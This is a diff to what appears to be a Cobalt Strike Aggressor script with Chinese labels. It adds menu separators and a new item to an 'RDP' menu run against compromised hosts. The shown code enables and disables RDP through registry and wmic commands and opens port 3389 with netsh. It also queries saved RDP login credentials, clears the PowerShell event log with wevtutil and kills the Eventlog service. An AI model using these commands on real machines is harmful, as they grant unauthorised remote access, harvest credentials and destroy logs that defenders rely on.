@@ -16,6 +16,7 @@ menu "☆ RDP相关" {
         bshell($bid,"wevtutil cl \"Windows PowerShell\"");
         }
     }
+    separator();
     item "开启 RDP 服务 (Powershell)" {
 		blog($1, "\c9=========== 开启 RDP 服务 (Powershell) ==========");
         bpowershell_import($1, script_resource("scripts/RemoteLogin/RegfDenyTSConnections.ps1"));
@@ -56,6 +57,8 @@ menu "☆ RDP相关" {
             }
         }
     }
+    separator();
+
     item "关闭 RDP 服务 (Powershell)" {
 		blog($1, "\c9=========== 关闭 RDP 服务 (Powershell) ==========");
         bpowershell_import($1, script_resource("scripts/RemoteLogin/RegfDenyTSConnections.ps1"));
@@ -67,6 +70,13 @@ menu "☆ RDP相关" {
         $bid = $1['@'];
         bshell($bid, "REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 1 /f");
         bshell($bid, "wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0");
+    }
+    separator();
+    item "防火墙放行 RDP 规则" {
+        blog($1, "\c9=========== 防火墙放行 RDP 规则 ==========");
+        $bid = $1['@'];
+        blog($bid,"如果系统未配置过远程桌面服务，第一次开启时还需要添加防火墙规则允许3389端口");
+        bshell($bid, "netsh advfirewall firewall add rule name=\"Remote Desktop\" protocol=TCP dir=in localport=3389 action=allow");
     }
     item "查询 RDP 历史登录凭据" {
 		blog($1, "\c9=========== 查询 RDP 历史登录凭据 ==========");
@@ -94,6 +104,7 @@ menu "☆ RDP相关" {
 		blog($1, "\c9=========== 查询 RDP 日志路径 ==========");
         bshell($1,"wmic nteventlog get path\,filename\,writeable");
     }
+    separator();
     item "关闭 EventlogService 服务" {
 		blog($1, "\c9=========== 关闭 EventlogService 服务 ==========");
         bpowershell_import($1, script_resource("scripts/RemoteLogin/KillEvenlogService.ps1"));
